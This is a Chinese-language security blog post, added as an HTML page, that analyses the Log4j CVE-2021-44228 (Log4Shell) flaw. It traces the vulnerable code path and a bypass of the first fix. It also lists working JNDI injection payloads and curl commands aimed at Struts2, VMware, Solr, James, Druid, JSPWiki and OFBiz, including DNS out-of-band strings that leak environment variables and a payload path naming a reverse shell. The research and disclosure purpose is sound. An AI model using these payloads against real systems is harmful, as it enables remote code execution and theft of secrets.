@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>log4j漏洞分析 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="log4j漏洞分析 | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2021/12/16/log4j漏洞分析/">
+<meta property="twitter:image" content="https://blog.play2win.top/2021/12/16/log4j漏洞分析/">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="log4j漏洞分析" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="log4j漏洞分析" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2021-12-16T12:09:53.000Z">2021-12-16</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/代码审计/">代码审计</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    17 分钟 读完 (大约 2569 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                log4j漏洞分析
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2021 年 12 月 10 日，Apache发布了其 Log4j 框架的 2.15.0 版，其中包括对 CVE-2021-44228 的修复，这是一个影响 Apache Log4j 2.14.1 及更早版本的关键 (CVSSv3 10) 远程代码执行 (RCE) 漏洞。该漏洞存在于 Log4j 处理器处理特制日志消息的方式中。不可信的字符串（例如，来自输入文本字段的字符串，例如 Web 应用程序搜索框）包含的内容<code>${jndi:ldap://example.com/a}</code>，如果启用了消息查找替换，将触发远程类加载、消息查找和相关内容的执行。成功利用 CVE-2021-44228 可以让未经身份验证的远程攻击者完全控制易受攻击的目标系统。</p>
+<a id="more"></a>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。</p>
+<p>Lookup提供了一种在任意位置向 Log4j 配置添加值的方法。它们是实现<code>StrLookup</code>接口的特定类型的插件。Lookup语法为<code>${prefix:name}</code>，其中前缀标识告诉Log4j应在特定上下文中使用的变量名称。</p>
+<table>
+<thead>
+<tr>
+<th>前缀</th>
+<th>上下文</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bundle</td>
+<td>资源束。格式为bundle:BundleName:BundleKey。捆绑包名称遵循包命名约定，如： {bundle:com.domain.Messages:MyKey}。</td>
+</tr>
+<tr>
+<td>ctx</td>
+<td>线程上下文映射（MDC）。</td>
+</tr>
+<tr>
+<td>date</td>
+<td>使用指定的格式插入当前日期和/或时间。</td>
+</tr>
+<tr>
+<td>env</td>
+<td>系统环境变量。</td>
+</tr>
+<tr>
+<td>jndi</td>
+<td>在默认的JNDI上下文中设置的值。</td>
+</tr>
+<tr>
+<td>jvmrunargs</td>
+<td>通过JMX访问的JVM输入参数，但不是主要参数; 请参阅<a href="http://docs.oracle.com/javase/6/docs/api/java/lang/management/RuntimeMXBean.html#getInputArguments--" target="_blank" rel="noopener">RuntimeMXBean.getInputArguments</a>在Android上不可用</td>
+</tr>
+<tr>
+<td>log4j</td>
+<td>Log4j配置属性。表达式<code>log4j:configLocation</code>和<code>log4j:configLocation</code>和<code>{log4j:configParentLocation}</code>分别提供给log4j的配置文件和它的父文件夹的绝对路径。</td>
+</tr>
+<tr>
+<td>main</td>
+<td>使用 MapLookup.setMainArguments(String[])设置的值。</td>
+</tr>
+<tr>
+<td>map</td>
+<td>来自MapMessage的值。</td>
+</tr>
+<tr>
+<td>sd</td>
+<td>来自StructuredDataMessage的值。“id”将返回没有企业号的StructuredDataId的名称。“type”将返回消息类型。其他键将从Map中取回单个元素。</td>
+</tr>
+<tr>
+<td>sys</td>
+<td>系统属性。</td>
+</tr>
+</tbody>
+</table>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>选用log4j-core 2.14.1版本，使用以下代码作为demo。启动一个恶意的RMI或LDAP服务，执行demo即可触发。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Log4jJNDI</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Logger logger = LogManager.getLogger(Log4jJNDI.class);</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.setProperty(<span class="hljs-string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="hljs-string">"true"</span>);</span><br><span class="line">        System.setProperty(<span class="hljs-string">"com.sun.jndi.ldap.object.trustURLCodebase"</span>, <span class="hljs-string">"true"</span>);</span><br><span class="line">        logger.error(<span class="hljs-string">"$&#123;jndi:rmi://127.0.0.1:8888/Calc&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 172549.png" alt></p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>跟进到<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code>，若未设置<code>nolookup</code>为true，遍历要输出的日志，<code>$</code>符号和<code>{</code>符号相继出现则会在后续将花括号中的内容作处理。<code>nolookup</code>在log4j 2.15.0之前是默认关闭的。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 173650.png" alt></p>
+<p>再跟进到<code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute</code>，在这里会从外到内递归<code>${</code>和<code>}</code>内的内容，然后使用通了中的<code>resolveVariable</code>方法解析并返回它的值。</p>
+<p>在<code>resolveVariable</code>方法里支持解析的前缀有<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>，实测在Spring框架下支持解析的前缀会有所不同。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 192736.png" alt></p>
+<p>继续跟进<code>org.apache.logging.log4j.core.lookup.Interpolator#lookup</code>，根据前缀从<code>strLookupMap</code>属性中获取相应的Lookup类实例。这里获取的是<code>JndiLookup</code>的实例，并调用该实例的<code>lookup</code>方法。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 194201.png" alt></p>
+<p><code>JndiLookup</code>的<code>lookup</code>方法里，调用<code>org.apache.logging.log4j.core.net.jndiManager</code>的<code>getDefaultManager</code>静态方法，返回<code>JndiManager</code>实例，其中的<code>context</code>属性被设置为<code>InitialContext</code>对象。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 195829.png" alt></p>
+<p>然后调用<code>JndiManager</code>实例的<code>lookup</code>方法，实际就是它的<code>context</code>属性<code>InitialContext</code>的<code>lookup</code>方法，后续流程就如常规JNDI注入，加载远程的恶意类执行其中的恶意代码。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 200606.png" alt></p>
+<h2 id="RC1修复绕过"><a href="#RC1修复绕过" class="headerlink" title="RC1修复绕过"></a>RC1修复绕过</h2><p>log4j在RC1中对JNDI注入问题的修复存在于github的commit记录<a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3" target="_blank" rel="noopener">LOG4J2-3201</a>中。在<code>JndiManager</code>类里对反序列化的类和JNDI服务器地址做了白名单校验。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">lookup</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String name)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">       <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">           URI uri = <span class="hljs-keyword">new</span> URI(name);</span><br><span class="line">           <span class="hljs-keyword">if</span> (uri.getScheme() != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">               <span class="hljs-keyword">if</span> (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                   LOGGER.warn(<span class="hljs-string">"Log4j JNDI does not allow protocol &#123;&#125;"</span>, uri.getScheme());</span><br><span class="line">                   <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="hljs-keyword">if</span> (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) &#123;</span><br><span class="line">                   <span class="hljs-keyword">if</span> (!allowedHosts.contains(uri.getHost())) &#123;</span><br><span class="line">                       LOGGER.warn(<span class="hljs-string">"Attempt to access ldap server not in allowed list"</span>);</span><br><span class="line">                       <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   Attributes attributes = <span class="hljs-keyword">this</span>.context.getAttributes(name);</span><br><span class="line">                   <span class="hljs-keyword">if</span> (attributes != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                       <span class="hljs-comment">// In testing the "key" for attributes seems to be lowercase while the attribute id is</span></span><br><span class="line">                       <span class="hljs-comment">// camelcase, but that may just be true for the test LDAP used here. This copies the Attributes</span></span><br><span class="line">                       <span class="hljs-comment">// to a Map ignoring the "key" and using the Attribute's id as the key in the Map so it matches</span></span><br><span class="line">                       <span class="hljs-comment">// the Java schema.</span></span><br><span class="line">                       Map&lt;String, Attribute&gt; attributeMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">                       NamingEnumeration&lt;? extends Attribute&gt; enumeration = attributes.getAll();</span><br><span class="line">                       <span class="hljs-keyword">while</span> (enumeration.hasMore()) &#123;</span><br><span class="line">                           Attribute attribute = enumeration.next();</span><br><span class="line">                           attributeMap.put(attribute.getID(), attribute);</span><br><span class="line">                       &#125;</span><br><span class="line">                       Attribute classNameAttr = attributeMap.get(CLASS_NAME);</span><br><span class="line">                       <span class="hljs-keyword">if</span> (attributeMap.get(SERIALIZED_DATA) != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                           <span class="hljs-keyword">if</span> (classNameAttr != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                               String className = classNameAttr.get().toString();</span><br><span class="line">                               <span class="hljs-keyword">if</span> (!allowedClasses.contains(className)) &#123;</span><br><span class="line">                                   LOGGER.warn(<span class="hljs-string">"Deserialization of &#123;&#125; is not allowed"</span>, className);</span><br><span class="line">                                   <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">                               &#125;</span><br><span class="line">                           &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                               LOGGER.warn(<span class="hljs-string">"No class name provided for &#123;&#125;"</span>, name);</span><br><span class="line">                               <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (attributeMap.get(REFERENCE_ADDRESS) != <span class="hljs-keyword">null</span></span><br><span class="line">                               || attributeMap.get(OBJECT_FACTORY) != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                           LOGGER.warn(<span class="hljs-string">"Referenceable class is not allowed for &#123;&#125;"</span>, name);</span><br><span class="line">                           <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="hljs-keyword">catch</span> (URISyntaxException ex) &#123;</span><br><span class="line">           <span class="hljs-comment">// This is OK.</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="hljs-keyword">return</span> (T) <span class="hljs-keyword">this</span>.context.lookup(name);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>但这个修复存在问题，如果<code>new URI(name)</code>抛出了<code>URISyntaxException</code>异常，则会跳过白名单校验直接调用<code>lookup</code>。URI加不编码的空格可以触发<code>URISyntaxException</code>跳出<code>try catch</code>直接执行lookup，但在<code>lookup</code>里会去掉空格，正常触发JNDI注入。</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="其他利用方式"><a href="#其他利用方式" class="headerlink" title="其他利用方式"></a>其他利用方式</h2><h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a>读取敏感信息</h3><p>log4j中的两个前缀<code>sys</code>和<code>env</code>，是分别通过<code>System.getProperty()</code>和<code>System.getenv()</code>实现的，能够获取环境变量和系统属性，再配合<code>Out-of-Band</code>，就能读取到环境变量和系统属性中的敏感信息。</p>
+<p>POC</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;env:USER&#125;.dnslog.cn/abc&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><p>bundle前缀<code>ResourceBundleLookup</code>中会把 key 按照 <code>:</code>分割成两份，第一个是 bundleName 获取 ResourceBundle，第二个是 bundleKey 获取 Properties Value。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 113526.png" alt></p>
+<p>bundle前缀在只引入log4j的项目上默认不支持，测试在spring框架里支持。</p>
+<p>POC</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;bundle:bundleName:bundleKey&#125;.ed7yce.dnslog.cn/abc&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 120301.png" alt></p>
+<h2 id="受影响组件触发方式"><a href="#受影响组件触发方式" class="headerlink" title="受影响组件触发方式"></a>受影响组件触发方式</h2><h3 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h3><ul>
+<li><p>检查请求路径触发</p>
+<p>在struts2-core包的<code>org.apache.struts2.dispatcher.mapper#cleanupActionName</code>中，检查action名的范围是否在<code>[a-zA-Z0-9._!/\-]</code>内，若存在访问之外的字符，则会将action名输出到WARN日志中。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> String <span class="hljs-title">cleanupActionName</span><span class="hljs-params">(String rawActionName)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.allowedActionNames.matcher(rawActionName).matches()) &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> rawActionName;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        LOG.warn(<span class="hljs-string">"&#123;&#125; did not match allowed action names &#123;&#125; - default action &#123;&#125; will be used!"</span>, rawActionName, <span class="hljs-keyword">this</span>.allowedActionNames, <span class="hljs-keyword">this</span>.defaultActionName);</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.defaultActionName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在请求路径中两个相邻的<code>/</code>会被转换为一个<code>/</code>，将其中一个<code>/</code>替换为<code>${::-/}</code>可防止被转换。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-15 163347.png" alt="屏幕截图 2021-12-15 163347"></p>
+<p>有的struts2版本的相同类中还存在<code>cleanupNamespaceName</code>方法，利用方式相同。</p>
+<p>POC</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/helloworld_war/$%7Bjndi:rmi:$%7B::-/%7D/127.0.0.1:8888/Calc%7D/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>检查请求参数长度</p>
+<p>在struts2-core包的<code>com.opensymphony.xwork2.interceptor#isWithinLengthLimit</code>中，访问一个存在的action，会检查请求参数名的长度，若长度超过默认的100个字符，请求参数名则会输出到debug日志中。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isWithinLengthLimit</span><span class="hljs-params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">boolean</span> matchLength = name.length() &lt;= <span class="hljs-keyword">this</span>.paramNameMaxLength;</span><br><span class="line">    <span class="hljs-keyword">if</span> (!matchLength) &#123;</span><br><span class="line">        LOG.debug(<span class="hljs-string">"Parameter [&#123;&#125;] is too long, allowed length is [&#123;&#125;]"</span>, name, String.valueOf(<span class="hljs-keyword">this</span>.paramNameMaxLength));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> matchLength;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>POC</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/helloworld_war/hello.action?$%7Bjndi:rmi://127.0.0.1:8888/Calc%7Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=123</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取静态文件If-Modified-Since头</p>
+<p>struts2在<code>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter#doFilter</code>拦截一个请求，且请求的路径不在排除的路径内，则会先调用<code>execute</code>属性的<code>executeStaticResourceRequest</code>方法，判断是否为静态文件。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 102729.png" alt></p>
+<p>在<code>org.apache.struts2.dispatcher.ExecuteOperations#executeStaticResourceRequest</code>里，请求以<code>struts</code>或<code>static</code>开头则会交给<code>DefaultStaticContentLoader</code>的<code>findStaticResource</code>处理。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 103413.png" alt></p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 103622.png" alt></p>
+<p><code>findStaticResource</code>方法中，静态文件会从struts2 core的<code>org.apache.struts.static</code>包下找，然后会交给同类的<code>process</code>方法处理。该包存在以下静态文件。</p>
+<blockquote>
+<p>tooltip.gif</p>
+<p>domtt.css</p>
+<p>utils.js</p>
+<p>domTT.js</p>
+<p>inputtransfersselect.js</p>
+<p>optiontransferselect.js</p>
+</blockquote>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 104446.png" alt></p>
+<p><code>process</code>方法里，静态文件输入流非空时，则会尝试将请求头<code>If-Modified-Since</code>的值转为Date类型，当转换失败抛出异常，<code>If-Modified-Since</code>的值就会输出到WARN日志中。</p>
+<p><img src="/2021/12/16/log4j漏洞分析/屏幕截图 2021-12-16 105724.png" alt></p>
+<p>我们访问struts2中默认的静态文件，并设置<code>If-Modified-Since</code>头为非Date类型即可触发log4j漏洞。</p>
+<p>POC</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -H &quot;If-Modified-Since: \$&#123;jndi:rmi:\$&#123;::-/&#125;/localhost:8888/Calc&#125;&quot; http://192.168.217.1:8080/helloworld_war/struts/utils.js</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="vmware"><a href="#vmware" class="headerlink" title="vmware"></a>vmware</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --insecure  -vv -H &quot;X-Forwarded-For: \$&#123;jndi:ldap://10.0.0.3:1270/lol&#125;&quot; &quot;https://10.0.0.4/websso/SAML2/SSO/photon-machine.lan?SAMLRequest=&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="slor"><a href="#slor" class="headerlink" title="slor"></a>slor</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;http://localhost:8983/solr/admin/collections?action=$&#123;jndi:ldap://xxx/Basic/ReverseShell/ip/9999&#125;&amp;wt=json&apos;</span><br><span class="line">curl &apos;http://localhost:8983/solr/admin/cores?action=CREATE&amp;name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D&amp;wt=json&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="James"><a href="#James" class="headerlink" title="James"></a>James</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 233 &gt; email.txt</span><br><span class="line">curl --url &quot;smtp://localhost&quot; --user &quot;test:test&quot; --mail-from &apos;$&#123;jndi:ldap://localhost:1270/abc&#125;@gmail.com&apos; --mail-rcpt &apos;test&apos; --upload-file email.txt</span><br></pre></td></tr></table></figure>
+<h3 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -X DELETE &apos;http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d&apos;</span><br></pre></td></tr></table></figure>
+<h3 id="JSPWiki"><a href="#JSPWiki" class="headerlink" title="JSPWiki"></a>JSPWiki</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv http://localhost:8080/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/</span><br></pre></td></tr></table></figure>
+<h3 id="OFBiz"><a href="#OFBiz" class="headerlink" title="OFBiz"></a>OFBiz</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --insecure -vv -H &quot;Cookie: OFBiz.Visitor=\$&#123;jndi:ldap://localhost:1270/abc&#125;&quot; https://localhost:8443/webtools/control/main</span><br></pre></td></tr></table></figure>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在成文那天早上，@su18师傅在群里发布log4j详细分析文章，其中还有log4j 1.x的JNDI利用思路，虽然实现条件挺苛刻，但不得不感叹师傅们真的细。</p>
+<p>这篇文章写下来就花了一天半的时间，比以往快了不少，转了安全研究岗还是有挺多时间学东西的，虽然也有怕leader催的缘故。😂</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html" target="_blank" rel="noopener">https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p>
+<p><a href="https://lorexxar.cn/2021/12/10/log4j2-jndi/#2-15-0-rc1-%E7%9A%84%E4%BF%AE%E5%A4%8D" target="_blank" rel="noopener">https://lorexxar.cn/2021/12/10/log4j2-jndi/#2-15-0-rc1-%E7%9A%84%E4%BF%AE%E5%A4%8D</a></p>
+<p><a href="https://xz.aliyun.com/t/10649#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/10649#toc-2</a></p>
+<p><a href="https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis" target="_blank" rel="noopener">https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis</a></p>
+
+        </div>
+        
